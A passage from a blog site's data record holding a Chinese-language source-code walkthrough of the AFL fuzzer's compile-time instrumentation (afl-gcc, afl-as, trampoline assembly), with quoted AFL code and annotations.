BIN_PATH);\n\nexit(1);\n\n}\n```\n\nc. 找到as路径\n\n```c\nfind_as(argv[0]);\n```\n\nd. 对于参数进行编辑\n\n```c\nedit_params(argc, argv);\n```\n\ne. 调用\n\n```c\nexecvp(cc_params[0], (char**)cc_params);\n```\n\n#### 0x3.edit_params()\n\nedit_params()被调用于编辑各种参数.  最后传递给真正的编译器(gcc / clang)，对于as的路径进行处理，使之调用到as的封装, afl-as。\n\n//主要是一些细节方面的，之后遇到了再来仔细查看\n\n#### 0x4. find_as()\n\n通过环境变量AFL_PATH找到封装的as的路径\n\n//同样主要是细节方面\n\n### afl-as.c\n\n#### 0x1. 基础变量\n\n| NAME                         | MEANING                               |\n| ---------------------------- | ------------------------------------- |\n| static u8** as_params        | *Parameters passed to the real 'as'*  |\n| static u8*  input_file       | *Originally specified input file*     |\n| static u8*  modified_file    | *Instrumented file for the real 'as'* |\n| static u32  inst_ratio = 100 | *Instrumentation probability (%)*     |\n\n\n\n#### 0x2. main函数主要逻辑\n\na. 同上，对各种模式的判断(这里和上面都对于APPLE都有不同，因为没接触过apple，暂且记下)\n\n```c\nclang_mode = !!getenv(CLANG_ENV_VAR);\n\nif (isatty(2) && !getenv(\"AFL_QUIET\")) {\n\nSAYF(cCYA \"afl-as \" cBRI VERSION cRST \" by <lcamtuf@google.com>\\n\");\n\n} else be_quiet = 1;\n```\n\n\n\nb. 获取随机数种子\n\n```c\ngettimeofday(&tv, &tz);\n\nrand_seed = tv.tv_sec ^ tv.tv_usec ^ getpid();\n\nsrandom(rand_seed);\n```\n\nc. 编辑参数\n\n```c\nedit_params(argc, argv);\n```\n\nd. 根据各种环境变量进行相关配置\n\n```c\n  if (inst_ratio_str) {\n\n    if (sscanf(inst_ratio_str, \"%u\", &inst_ratio) != 1 || inst_ratio > 100) \n      FATAL(\"Bad value of AFL_INST_RATIO (must be between 0 and 100)\");\n\n  }\n// 代码插桩率的设置\n\n  if (getenv(AS_LOOP_ENV_VAR))\n    FATAL(\"Endless loop when calling 'as' (remove '.' from your PATH)\");\n\n  setenv(AS_LOOP_ENV_VAR, \"1\", 1);\n\n  /* When compiling with ASAN, we don't have a particularly elegant way to skip\n     ASAN-specific branches. But we can probabilistically compensate for\n     that... */\n\n  if (getenv(\"AFL_USE_ASAN\") || getenv(\"AFL_USE_MSAN\")) {\n    sanitizer = 1;\n    inst_ratio /= 3;\n  }\n```\n\ne. 代码插桩\n\n```c\nif (!just_version) add_instrumentation();\n```\n\nf. 调用as\n\n```c\n  if (!(pid = fork())) {\n\n    execvp(as_params[0], (char**)as_params);\n    FATAL(\"Oops, failed to execute '%s' - check your PATH\", as_params[0]);\n\n  }\n\n  if (pid < 0) PFATAL(\"fork() failed\");\n\n  if (waitpid(pid, &status, 0) <= 0) PFATAL(\"waitpid() failed\");\n\n  if (!getenv(\"AFL_KEEP_ASSEMBLY\")) unlink(modified_file);\n\n  exit(WEXITSTATUS(status));\n```\n\n\n\n#### 0x3. add_instrumentation()代码插桩\n\n##### a. 主要流程\n\na-1. 打开输入文件和更改后的输出文件\n\n```c\n  if (input_file) {\n\n    inf = fopen(input_file, \"r\");\n    if (!inf) PFATAL(\"Unable to read '%s'\", input_file);\n\n  } else inf = stdin;\n\n  outfd = open(modified_file, O_WRONLY | O_EXCL | O_CREAT, 0600);\n\n  if (outfd < 0) PFATAL(\"Unable to write to '%s'\", modified_file);\n\n  outf = fdopen(outfd, \"w\");\n\n  if (!outf) PFATAL(\"fdopen() failed\");  \n```\n\na-2. 读取每一行到line数组\n\n```c\n  while (fgets(line, MAX_LINE, inf)) {//这个括号匹配到最后\n\n    /* In some cases, we want to defer writing the instrumentation trampoline\n       until after all the labels, macros, comments, etc. If we're in this\n       mode, and if the line starts with a tab followed by a character, dump\n       the trampoline now. */\n\n    if (!pass_thru && !skip_intel && !skip_app && !skip_csect && instr_ok &&\n        instrument_next && line[0] == '\\t' && isalpha(line[1])) {\n\n      fprintf(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,\n              R(MAP_SIZE));\n// 这里是defered mode插桩执行语句\n      instrument_next = 0;\n      ins_lines++;\n\n    }\n    fputs(line, outf);\n```\n\n\n\na-3. 对于插桩的核心处理，定位有跳转语句， 设置flag\n\n```c\n    if (pass_thru) continue;\n\n    /* All right, this is where the actual fun begins. For one, we only want to\n       instrument the .text section. So, let's keep track of that in processed\n       files - and let's set instr_ok accordingly. */\n\n    if (line[0] == '\\t' && line[1] == '.') {\n\n      /* OpenBSD puts jump tables directly inline with the code, which is\n         a bit annoying. They use a specific format of p2align directives\n         around them, so we use that as a signal. */\n// 匹配文件中声明的段\n      if (!clang_mode && instr_ok && !strncmp(line + 2, \"p2align \", 8) &&\n          isdigit(line[10]) && line[11] == '\\n') skip_next_label = 1;\n\n      if (!strncmp(line + 2, \"text\\n\", 5) ||\n          !strncmp(line + 2, \"section\\t.text\", 13) ||\n          !strncmp(line + 2, \"section\\t__TEXT,__text\", 21) ||\n          !strncmp(line + 2, \"section __TEXT,__text\", 21)) {\n        instr_ok = 1;\n        continue; \n        // 尝试匹配.text，匹配成功设置标志位为1(即可以插桩)\n        // 进入下一次迭代\n      }\n\n      if (!strncmp(line + 2, \"section\\t\", 8) ||\n          !strncmp(line + 2, \"section \", 8) ||\n          !strncmp(line + 2, \"bss\\n\", 4) ||\n          !strncmp(line + 2, \"data\\n\", 5)) {\n        instr_ok = 0;\n        continue;\n      }\n\n    }\n\n    /* Detect off-flavor assembly (rare, happens in gdb). When this is\n       encountered, we set skip_csect until the opposite directive is\n       seen, and we do not instrument. */\n\n    if (strstr(line, \".code\")) {\n\n      if (strstr(line, \".code32\")) skip_csect = use_64bit;\n      if (strstr(line, \".code64\")) skip_csect = !use_64bit;\n\n    }\n\n    /* Detect syntax changes, as could happen with hand-written assembly.\n       Skip Intel blocks, resume instrumentation when back to AT&T. */\n\n    if (strstr(line, \".intel_syntax\")) skip_intel = 1;\n    if (strstr(line, \".att_syntax\")) skip_intel = 0;\n\n    /* Detect and skip ad-hoc __asm__ blocks, likewise skipping them. */\n\n    if (line[0] == '#' || line[1] == '#') {\n\n      if (strstr(line, \"#APP\")) skip_app = 1;\n      if (strstr(line, \"#NO_APP\")) skip_app = 0;\n\n    }\n\n    /* If we're in the right mood for instrumenting, check for function\n       names or conditional labels. This is a bit messy, but in essence,\n       we want to catch:\n\n         ^main:      - function entry point (always instrumented)\n         ^.L0:       - GCC branch label\n         ^.LBB0_0:   - clang branch label (but only in clang mode)\n         ^\\tjnz foo  - conditional branches\n\n       ...but not:\n\n         ^# BB#0:    - clang comments\n         ^ # BB#0:   - ditto\n         ^.Ltmp0:    - clang non-branch labels\n         ^.LC0       - GCC non-branch labels\n         ^.LBB0_0:   - ditto (when in GCC mode)\n         ^\\tjmp foo  - non-conditional jumps\n\n       Additionally, clang and GCC on MacOS X follow a different convention\n       with no leading dots on labels, hence the weird maze of #ifdefs\n       later on.\n\n     */\n\n    if (skip_intel || skip_app || skip_csect || !instr_ok ||\n        line[0] == '#' || line[0] == ' ') continue;\n\n    /* Conditional branch instruction (jnz, etc). We append the instrumentation\n       right after the branch (to instrument the not-taken path) and at the\n       branch destination label (handled later on). */\n\n    if (line[0] == '\\t') {\n\n      if (line[1] == 'j' && line[2] != 'm' && R(100) < inst_ratio) {\n\n        fprintf(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,\n                R(MAP_SIZE));\n\n        ins_lines++;\n\n      }\n// 捕捉跳转标志，调用随机数函数，选择是否进行插桩\n      continue;\n\n    }\n\n    /* Label of some sort. This may be a branch destination, but we need to\n       tread carefully and account for several different formatting\n       conventions. */\n\n#ifdef __APPLE__\n\n    /* Apple: L<whatever><digit>: */\n\n    if ((colon_pos = strstr(line, \":\"))) {\n\n      if (line[0] == 'L' && isdigit(*(colon_pos - 1))) {\n\n#else\n\n    /* Everybody else: .L<whatever>: */\n\n    if (strstr(line, \":\")) {\n\n      if (line[0] == '.') {\n\n#endif /* __APPLE__ */\n\n        /* .L0: or LBB0_0: style jump destination */\n\n#ifdef __APPLE__\n\n        /* Apple: L<num> / LBB<num> */\n\n        if ((isdigit(line[1]) || (clang_mode && !strncmp(line, \"LBB\", 3)))\n            && R(100) < inst_ratio) {\n\n#else\n\n        /* Apple: .L<num> / .LBB<num> */\n\n        if ((isdigit(line[2]) || (clang_mode && !strncmp(line + 1, \"LBB\", 3)))\n            && R(100) < inst_ratio) {\n\n#endif /* __APPLE__ */\n\n          /* An optimization is possible here by adding the code only if the\n             label is mentioned in the code in contexts other than call / jmp.\n             That said, this complicates the code by requiring two-pass\n             processing (messy with stdin), and results in a speed gain\n             typically under 10%, because compilers are generally pretty good\n             about not generating spurious intra-function jumps.\n\n             We use deferred output chiefly to avoid disrupting\n             .Lfunc_begin0-style exception handling calculations (a problem on\n             MacOS X). */\n\n          if (!skip_next_label) instrument_next = 1; else skip_next_label = 0;\n\n        }\n\n      } else {\n\n        /* Function label (always instrumented, deferred mode). */\n\n        instrument_next = 1;\n    \n      }\n\n    }\n\n  }\n```\n\n##### b. trampoline插桩代码\n\n这些部分的声明在afl-as.h\n\n###### b-1 .bss段变量\n\n- `__afl_area_ptr`：共享内存地址；\n- `__afl_prev_loc`：上一个插桩位置（id为R(100)随机数的值）；\n- `__afl_fork_pid`：由fork产生的子进程的pid；\n- `__afl_temp`：缓冲区；\n- `__afl_setup_failure`：标志位，如果置位则直接退出；\n- `__afl_global_area_ptr`：全局指针。\n\n###### b-1.trampoline_fmt_64/32\n\n```assembly\nstatic const u8* trampoline_fmt_32 =\n\n  \"\\n\"\n  \"/* --- AFL TRAMPOLINE (32-BIT) --- */\\n\"\n  \"\\n\"\n  \".align 4\\n\"\n  \"\\n\"\n  \"leal -16(%%esp), %%esp\\n\"\n  \"movl %%edi,  0(%%esp)\\n\"\n  \"movl %%edx,  4(%%esp)\\n\"\n  \"movl %%ecx,  8(%%esp)\\n\"\n  \"movl %%eax, 12(%%esp)\\n\"\n  \"movl $0x%08x, %%ecx\\n\"  //想ecx存入随机桩代码\n  \"call __afl_maybe_log\\n\" //调用__afl_maybe_log\n  \"movl 12(%%esp), %%eax\\n\"\n  \"movl  8(%%esp), %%ecx\\n\"\n  \"movl  4(%%esp), %%edx\\n\"\n  \"movl  0(%%esp), %%edi\\n\"\n  \"leal 16(%%esp), %%esp\\n\"\n  \"\\n\"\n  \"/* --- END --- */\\n\"\n  \"\\n\";\n\nstatic const u8* trampoline_fmt_64 =\n\n  \"\\n\"\n  \"/* --- AFL TRAMPOLINE (64-BIT) --- */\\n\"\n  \"\\n\"\n  \".align 4\\n\"\n  \"\\n\"\n  \"leaq -(128+24)(%%rsp), %%rsp\\n\"\n  \"movq %%rdx,  0(%%rsp)\\n\"\n  \"movq %%rcx,  8(%%rsp)\\n\"\n  \"movq %%rax, 16(%%rsp)\\n\"\n  \"movq $0x%08x, %%rcx\\n\"\n  \"call __afl_maybe_log\\n\"\n  \"movq 16(%%rsp), %%rax\\n\"\n  \"movq  8(%%rsp), %%rcx\\n\"\n  \"movq  0(%%rsp), %%rdx\\n\"\n  \"leaq (128+24)(%%rsp), %%rsp\\n\"\n  \"\\n\"\n  \"/* --- END --- */\\n\"\n  \"\\n\";\n\n```\n\n主要功能: \n\n- 保存 `rdx`、 `rcx` 、`rax` 寄存器\n- 将 `rcx` 的值设置为 `fprintf()` 函数将要打印的变量内容\n- 调用 `__afl_maybe_log` 函数\n- 恢复寄存器\n\n###### b-2. __afl_maybe_log\n\n```c\n  \"__afl_maybe_log:\\n\"\n  \"\\n\"\n  \"  lahf\\n\"   // 对于标志位的处理\n  \"  seto %al\\n\" \n  \"\\n\"\n  \"  /* Check if SHM region is already mapped. */\\n\"\n  \"\\n\"\n  \"  movl  __afl_area_ptr, %edx\\n\"\n  \"  testl %edx, %edx\\n\"    //判断__afl_area_ptr是否为NULL\n  \"  je    __afl_setup\\n\"\t//为NULL则跳转设置\n  \"\\n\"\n```\n\n","source":"_posts/Source-Code-Analysis-of-AFL-[1]-code-instrumentation.md","raw":"---\ntitle: Source-Code-Analysis-of-AFL-[1]-code-instrumentation\ndate: 2022-7-1\ntags: \n- Pwn\n- Fuzz\n\ncategories:\n- Fuzz\n\ntoc: true # 是否启用内容索引\nsidebar: none # 是否启用sidebar侧边栏，none：不启用zh\n---\n\n\n\n\n\n\n\nAFL源代码阅读[1]， 主要包含对afl-gcc.c 和afl-as.c的流程分析，也即插桩的过程。而插桩后进程间通信的过程相对复杂，将在后面单独分析。\n\n# 0x1 文件依赖结构\n\n基本文件结构: \n\n- **afl-as.c、afl-as.h、afl-gcc.c** :普通的代码插桩\n- **afl-fuzz.c** \n  fuzzer实现代码 核心\n- llvm_mode \n  llvm模式进行插桩，仅clang适用\n- qemu_mode \n  qemu模式插桩，针对二进制文件\n- libdislocator \n  简单的内存检测工具\n- libtokencap \n  语法关键字提取并生成字典文件\n- afl-analyze.c \n  对测试样例的字典进行分析\n- afl_cmin \n  对fuzzing用到的语料库进行精简操作\n- afl_tmin.c \n  对fuzzing中用到的测试用例进行最小化操作\n- afl-gotcpu.c \n  统计cpu占用率\n- afl-plot \n  绘制报告图标\n- afl-showmap.c \n  打印目标程序fuzz后的tuple信息\n- afl-whatsup \n  并行fuzz结果统计\n- alloc-inl.h \n  定义带检测功能的内存分配和释放操作\n- Hash.h \n  hash函数的实现和定义\n- test-instr.c \n  测试的目标程序\n- dos\n  相关说明文档\n- experimental \n  一些新特性的试验研究\n\n\n\n# 0x2 基本模块分析\n\n## (1)代码插桩\n\n基本流程: afl-gcc  -->  afl-as \n\n### afl-gcc.c\n\n#### 0x1.基础变量\n\n| name                       | meaning                            |\n| -------------------------- | ---------------------------------- |\n| static u8*  as_path        | *Path to the AFL 'as' wrapper*     |\n| static u8** cc_params      | *Parameters passed to the real CC* |\n| static u32  cc_par_cnt = 1 | *Param count, including argv0*     |\n| static u8  be_quiet        | *Quiet mode*                       |\n| static u8 clang_mode       | *Invoked as afl-clang?*            |\n\n\n\n#### 0x2.main函数核心流程\n\na.检查是否是静默模式\n\n```c\nif (isatty(2) && !getenv(\"AFL_QUIET\")) {\n\nSAYF(cCYA \"afl-cc \" cBRI VERSION cRST \" by <lcamtuf@google.com>\\n\");\n\n} else be_quiet = 1;\n```\n\nb. 检查参数是否完备\n\n```c\nif (argc < 2) {\n\nSAYF(\"\\n\"\n     \"This is a helper application for afl-fuzz. It serves as a drop-in replacement\\n\"\n     \"for gcc or clang, letting you recompile third-party code with the required\\n\"\n     \"runtime instrumentation. A common use pattern would be one of the following:\\n\\n\"\n\n     \"  CC=%s/afl-gcc ./configure\\n\"\n     \"  CXX=%s/afl-g++ ./configure\\n\\n\"\n\n     \"You can specify custom next-stage toolchain via AFL_CC, AFL_CXX, and AFL_AS.\\n\"\n     \"Setting AFL_HARDEN enables hardening optimizations in the compiled code.\\n\\n\",\n     BIN_PATH, BIN_PATH);\n\nexit(1);\n\n}\n```\n\nc. 找到as路径\n\n```c\nfind_as(argv[0]);\n```\n\nd. 对于参数进行编辑\n\n```c\nedit_params(argc, argv);\n```\n\ne. 调用\n\n```c\nexecvp(cc_params[0], (char**)cc_params);\n```\n\n#### 0x3.edit_params()\n\nedit_params()被调用于编辑各种参数.  最后传递给真正的编译器(gcc / clang)，对于as的路径进行处理，使之调用到as的封装, afl-as。\n\n//主要是一些细节方面的，之后遇到了再来仔细查看\n\n#### 0x4. find_as()\n\n通过环境变量AFL_PATH找到封装的as的路径\n\n//同样主要是细节方面\n\n### afl-as.c\n\n#### 0x1. 基础变量\n\n| NAME                         | MEANING                               |\n| ---------------------------- | ------------------------------------- |\n| static u8** as_params        | *Parameters passed to the real 'as'*  |\n| static u8*  input_file       | *Originally specified input file*     |\n| static u8*  modified_file    | *Instrumented file for the real 'as'* |\n| static u32  inst_ratio = 100 | *Instrumentation probability (%)*     |\n\n\n\n#### 0x2. main函数主要逻辑\n\na. 同上，对各种模式的判断(这里和上面都对于APPLE都有不同，因为没接触过apple，暂且记下)\n\n```c\nclang_mode = !!getenv(CLANG_ENV_VAR);\n\nif (isatty(2) && !getenv(\"AFL_QUIET\")) {\n\nSAYF(cCYA \"afl-as \" cBRI VERSION cRST \" by <lcamtuf@google.com>\\n\");\n\n} else be_quiet = 1;\n```\n\n\n\nb. 获取随机数种子\n\n```c\ngettimeofday(&tv, &tz);\n\nrand_seed = tv.tv_sec ^ tv.tv_usec ^ getpid();\n\nsrandom(rand_seed);\n```\n\nc. 编辑参数\n\n```c\nedit_params(argc, argv);\n```\n\nd. 根据各种环境变量进行相关配置\n\n```c\n  if (inst_ratio_str) {\n\n    if (sscanf(inst_ratio_str, \"%u\", &inst_ratio) != 1 || inst_ratio > 100) \n      FATAL(\"Bad value of AFL_INST_RATIO (must be between 0 and 100)\");\n\n  }\n// 代码插桩率的设置\n\n  if (getenv(AS_LOOP_ENV_VAR))\n    FATAL(\"Endless loop when calling 'as' (remove '.' from your PATH)\");\n\n  setenv(AS_LOOP_ENV_VAR, \"1\", 1);\n\n  /* When compiling with ASAN, we don't have a particularly elegant way to skip\n     ASAN-specific branches. But we can probabilistically compensate for\n     that... */\n\n  if (getenv(\"AFL_USE_ASAN\") || getenv(\"AFL_USE_MSAN\")) {\n    sanitizer = 1;\n    inst_ratio /= 3;\n  }\n```\n\ne. 代码插桩\n\n```c\nif (!just_version) add_instrumentation();\n```\n\nf. 调用as\n\n```c\n  if (!(pid = fork())) {\n\n    execvp(as_params[0], (char**)as_params);\n    FATAL(\"Oops, failed to execute '%s' - check your PATH\", as_params[0]);\n\n  }\n\n  if (pid < 0) PFATAL(\"fork() failed\");\n\n  if (waitpid(pid, &status, 0) <= 0) PFATAL(\"waitpid() failed\");\n\n  if (!getenv(\"AFL_KEEP_ASSEMBLY\")) unlink(modified_file);\n\n  exit(WEXITSTATUS(status));\n```\n\n\n\n#### 0x3. add_instrumentation()代码插桩\n\n##### a. 主要流程\n\na-1. 打开输入文件和更改后的输出文件\n\n```c\n  if (input_file) {\n\n    inf = fopen(input_file, \"r\");\n    if (!inf) PFATAL(\"Unable to read '%s'\", input_file);\n\n  } else inf = stdin;\n\n  outfd = open(modified_file, O_WRONLY | O_EXCL | O_CREAT, 0600);\n\n  if (outfd < 0) PFATAL(\"Unable to write to '%s'\", modified_file);\n\n  outf = fdopen(outfd, \"w\");\n\n  if (!outf) PFATAL(\"fdopen() failed\");  \n```\n\na-2. 读取每一行到line数组\n\n```c\n  while (fgets(line, MAX_LINE, inf)) {//这个括号匹配到最后\n\n    /* In some cases, we want to defer writing the instrumentation trampoline\n       until after all the labels, macros, comments, etc. If we're in this\n       mode, and if the line starts with a tab followed by a character, dump\n       the trampoline now. */\n\n    if (!pass_thru && !skip_intel && !skip_app && !skip_csect && instr_ok &&\n        instrument_next && line[0] == '\\t' && isalpha(line[1])) {\n\n      fprintf(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,\n              R(MAP_SIZE));\n// 这里是defered mode插桩执行语句\n      instrument_next = 0;\n      ins_lines++;\n\n    }\n    fputs(line, outf);\n```\n\n\n\na-3. 对于插桩的核心处理，定位有跳转语句， 设置flag\n\n```c\n    if (pass_thru) continue;\n\n    /* All right, this is where the actual fun begins. For one, we only want to\n       instrument the .text section. So, let's keep track of that in processed\n       files - and let's set instr_ok accordingly. */\n\n    if (line[0] == '\\t' && line[1] == '.') {\n\n      /* OpenBSD puts jump tables directly inline with the code, which is\n         a bit annoying. They use a specific format of p2align directives\n         around them, so we use that as a signal. */\n// 匹配文件中声明的段\n      if (!clang_mode && instr_ok && !strncmp(line + 2, \"p2align \", 8) &&\n          isdigit(line[10]) && line[11] == '\\n') skip_next_label = 1;\n\n      if (!strncmp(line + 2, \"text\\n\", 5) ||\n          !strncmp(line + 2, \"section\\t.text\", 13) ||\n          !strncmp(line + 2, \"section\\t__TEXT,__text\", 21) ||\n          !strncmp(line + 2, \"section __TEXT,__text\", 21)) {\n        instr_ok = 1;\n        continue; \n        // 尝试匹配.text，匹配成功设置标志位为1(即可以插桩)\n        // 进入下一次迭代\n      }\n\n      if (!strncmp(line + 2, \"section\\t\", 8) ||\n          !strncmp(line + 2, \"section \", 8) ||\n          !strncmp(line + 2, \"bss\\n\", 4) ||\n          !strncmp(line + 2, \"data\\n\", 5)) {\n        instr_ok = 0;\n        continue;\n      }\n\n    }\n\n    /* Detect off-flavor assembly (rare, happens in gdb). When this is\n       encountered, we set skip_csect until the opposite directive is\n       seen, and we do not instrument. */\n\n    if (strstr(line, \".code\")) {\n\n      if (strstr(line, \".code32\")) skip_csect = use_64bit;\n      if (strstr(line, \".code64\")) skip_csect = !use_64bit;\n\n    }\n\n    /* Detect syntax changes, as could happen with hand-written assembly.\n       Skip Intel blocks, resume instrumentation when back to AT&T. */\n\n    if (strstr(line, \".intel_syntax\")) skip_intel = 1;\n    if (strstr(line, \".att_syntax\")) skip_intel = 0;\n\n    /* Detect and skip ad-hoc __asm__ blocks, likewise skipping them. */\n\n    if (line[0] == '#' || line[1] == '#') {\n\n      if (strstr(line, \"#APP\")) skip_app = 1;\n      if (strstr(line, \"#NO_APP\")) skip_app = 0;\n\n    }\n\n    /* If we're in the right mood for instrumenting, check for function\n       names or conditional labels. This is a bit messy, but in essence,\n       we want to catch:\n\n         ^main:      - function entry point (always instrumented)\n         ^.L0:       - GCC branch label\n         ^.LBB0_0:   - clang branch label (but only in clang mode)\n         ^\\tjnz foo  - conditional branches\n\n       ...but not:\n\n         ^# BB#0:    - clang comments\n         ^ # BB#0:   - ditto\n         ^.Ltmp0:    - clang non-branch labels\n         ^.LC0       - GCC non-branch labels\n         ^.LBB0_0:   - ditto (when in GCC mode)\n         ^\\tjmp foo  - non-conditional jumps\n\n       Additionally, clang and GCC on MacOS X follow a different convention\n       with no leading dots on labels, hence the weird maze of #ifdefs\n       later on.\n\n     */\n\n    if (skip_intel || skip_app || skip_csect || !instr_ok ||\n        line[0] == '#' || line[0] == ' ') continue;\n\n    /* Conditional branch instruction (jnz, etc). We append the instrumentation\n       right after the branch (to instrument the not-taken path) and at the\n       branch destination label (handled later on). */\n\n    if (line[0] == '\\t') {\n\n      if (line[1] == 'j' && line[2] != 'm' && R(100) < inst_ratio) {\n\n        fprintf(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,\n                R(MAP_SIZE));\n\n        ins_lines++;\n\n      }\n// 捕捉跳转标志，调用随机数函数，选择是否进行插桩\n      continue;\n\n    }\n\n    /* Label of some sort. This may be a branch destination, but we need to\n       tread carefully and account for several different formatting\n       conventions. */\n\n#ifdef __APPLE__\n\n    /* Apple: L<whatever><digit>: */\n\n    if ((colon_pos = strstr(line, \":\"))) {\n\n      if (line[0] == 'L' && isdigit(*(colon_pos - 1))) {\n\n#else\n\n    /* Everybody else: .L<whatever>: */\n\n    if (strstr(line, \":\")) {\n\n      if (line[0] == '.') {\n\n#endif /* __APPLE__ */\n\n        /* .L0: or LBB0_0: style jump destination */\n\n#ifdef __APPLE__\n\n        /* Apple: L<num> / LBB<num> */\n\n        if ((isdigit(line[1]) || (clang_mode && !strncmp(line, \"LBB\", 3)))\n            && R(100) < inst_ratio) {\n\n#else\n\n        /* Apple: .L<num> / .LBB<num> */\n\n        if ((isdigit(line[2]) || (clang_mode && !strncmp(line + 1, \"LBB\", 3)))\n            && R(100) < inst_ratio) {\n\n#endif /* __APPLE__ */\n\n          /* An optimization is possible here by adding the code only if the\n             label is mentioned in the code in contexts other than call / jmp.\n             That said, this complicates the code by requiring two-pass\n             processing (messy with stdin), and results in a speed gain\n             typically under 10%, because compilers are generally pretty good\n             about not generating spurious intra-function jumps.\n\n             We use deferred output chiefly to avoid disrupting\n             .Lfunc_begin0-style exception handling calculations (a problem on\n             MacOS X). */\n\n          if (!skip_next_label) instrument_next = 1; else skip_next_label = 0;\n\n        }\n\n      } else {\n\n        /* Function label (always instrumented, deferred mode). */\n\n        instrument_next = 1;\n    \n      }\n\n    }\n\n  }\n```\n\n##### b. trampoline插桩代码\n\n这些部分的声明在afl-as.h\n\n###### b-1 .bss段变量\n\n- `__afl_area_ptr`：共享内存地址；\n- `__afl_prev_loc`：上一个插桩位置（id为R(100)随机数的值）；\n- `__afl_fork_pid`：由fork产生的子进程的pid；\n- `__afl_temp`：缓冲区；\n- `__afl_setup_failure`：标志位，如果置位则直接退出；\n- `__afl_global_area_ptr`：全局指针。\n\n###### b-1.trampoline_fmt_64/32\n\n```assembly\nstatic const u8* trampoline_fmt_32 =\n\n  \"\\n\"\n  \"/* --- AFL TRAMPOLINE (32-BIT) --- */\\n\"\n  \"\\n\"\n  \".align 4\\n\"\n  \"\\n\"\n  \"leal -16(%%esp), %%esp\\n\"\n  \"movl %%edi,  0(%%esp)\\n\"\n  \"movl %%edx,  4(%%esp)\\n\"\n  \"movl %%ecx,  8(%%esp)\\n\"\n  \"movl %%eax, 12(%%esp)\\n\"\n  \"movl $0x%08x, %%ecx\\n\"  //想ecx存入随机桩代码\n  \"call __afl_maybe_log\\n\" //调用__afl_maybe_log\n  \"movl 12(%%esp), %%eax\\n\"\n  \"movl  8(%%esp), %%ecx\\n\"\n  \"movl  4(%%esp), %%edx\\n\"\n  \"movl  0(%%esp), %%edi\\n\"\n  \"leal 16(%%esp), %%esp\\n\"\n  \"\\n\"\n  \"/* --- END --- */\\n\"\n  \"\\n\";\n\nstatic const u8* trampoline_fmt_64 =\n\n  \"\\n\"\n  \"/* --- AFL TRAMPOLINE (64-BIT) --- */\\n\"\n  \"\\n\"\n  \".align 4\\n\"\n  \"\\n\"\n  \"leaq -(128+24)(%%rsp), %%rsp\\n\"\n  \"movq %%rdx,  0(%%rsp)\\n\"\n  \"movq %%rcx,  8(%%rsp)\\n\"\n  \"movq %%rax, 16(%%rsp)\\n\"\n  \"movq $0x%08x, %%rcx\\n\"\n  \"call __afl_maybe_log\\n\"\n  \"movq 16(%%rsp), %%rax\\n\"\n  \"movq  8(%%rsp), %%rcx\\n\"\n  \"movq  0(%%rsp), %%rdx\\n\"\n  \"leaq (128+24)(%%rsp), %%rsp\\n\"\n  \"\\n\"\n  \"/* --- END --- */\\n\"\n  \"\\n\";\n\n```\n\n主要功能: \n\n- 保存 `rdx`、 `rcx` 、`rax` 寄存器\n- 将 `rcx` 的值设置为 `fprintf()` 函数将要打印的变量内容\n- 调用 `__afl_maybe_log` 函数\n- 恢复寄存器\n\n###### b-2. __afl_maybe_log\n\n```c\n  \"__afl_maybe_log:\\n\"\n  \"\\n\"\n  \"  lahf\\n\"   // 对于标志位的处理\n  \"  seto %al\\n\" \n  \"\\n\"\n  \"  /* Check if SHM region is already mapped. */\\n\"\n  \"\\n\"\n  \"  movl  __afl_area_ptr, %edx\\n\"\n  \"  testl %edx, %edx\\n\"    //判断__afl_area_ptr是否为NULL\n  \"  je    __afl_setup\\n\"\t//为NULL则跳转设置\n  \"\\n\"\n```\n\n","slug":"Source-Code-Analysis-of-AFL-[1]-code-instrumentation","published":1,"updated":"2022-07-15T12:35:30.516Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cl6g6majc000bj8v04as2g69h","content":"<p>AFL源代码阅读[1]， 主要包含对afl-gcc.c 和afl-as.c的流程分析，也即插桩的过程。而插桩后进程间通信的过程相对复杂，将在后面单独分析。</p>\n<h1 id=\"0x1-文件依赖结构\">0x1 文件依赖结构</h1>\n<p>基本文件结构:</p>\n<ul>\n<li><strong>afl-as.c、afl-as.h、afl-gcc.c</strong> :普通的代码插桩</li>\n<li><strong>afl-fuzz.c</strong><br>\nfuzzer实现代码 核心</li>\n<li>llvm_mode<br>\nllvm模式进行插桩，仅clang适用</li>\n<li>qemu_mode<br>\nqemu模式插桩，针对二进制文件</li>\n<li>libdislocator<br>\n简单的内存检测工具</li>\n<li>libtokencap<br>\n语法关键字提取并生成字典文件</li>\n<li>afl-analyze.c<br>\n对测试样例的字典进行分析</li>\n<li>afl_cmin<br>\n对fuzzing用到的语料库进行精简操作</li>\n<li>afl_tmin.c<br>\n对fuzzing中用到的测试用例进行最小化操作</li>\n<li>afl-gotcpu.c<br>\n统计cpu占用率</li>\n<li>afl-plot<br>\n绘制报告图标</li>\n<li>afl-showmap.c<br>\n打印目标程序fuzz后的tuple信息</li>\n<li>afl-whatsup<br>\n并行fuzz结果统计</li>\n<li>alloc-inl.h<br>\n定义带检测功能的内存分配和释放操作</li>\n<li>Hash.h<br>\nhash函数的实现和定义</li>\n<li>test-instr.c<br>\n测试的目标程序</li>\n<li>dos<br>\n相关说明文档</li>\n<li>experimental<br>\n一些新特性的试验研究</li>\n</ul>\n<h1 id=\"0x2-基本模块分析\">0x2 基本模块分析</h1>\n<h2 id=\"1-代码插桩\">(1)代码插桩</h2>\n<p>基本流程: afl-gcc  --&gt;  afl-as</p>\n<h3 id=\"afl-gcc-c\">afl-gcc.c</h3>\n<h4 id=\"0x1-基础变量\">0x1.基础变量</h4>\n<table>\n<thead>\n<tr>\n<th>name</th>\n<th>meaning</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>static u8*  as_path</td>\n<td><em>Path to the AFL ‘as’ wrapper</em></td>\n</tr>\n<tr>\n<td>static u8** cc_params</td>\n<td><em>Parameters passed to the real CC</em></td>\n</tr>\n<tr>\n<td>static u32  cc_par_cnt = 1</td>\n<td><em>Param count, including argv0</em></td>\n</tr>\n<tr>\n<td>static u8  be_quiet</td>\n<td><em>Quiet mode</em></td>\n</tr>\n<tr>\n<td>static u8 clang_mode</td>\n<td><em>Invoked as afl-clang?</em></td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"0x2-main函数核心流程\">0x2.main函数核心流程</h4>\n<p>a.检查是否是静默模式</p>\n<figure class=\"highlight c\"><table><tr><td 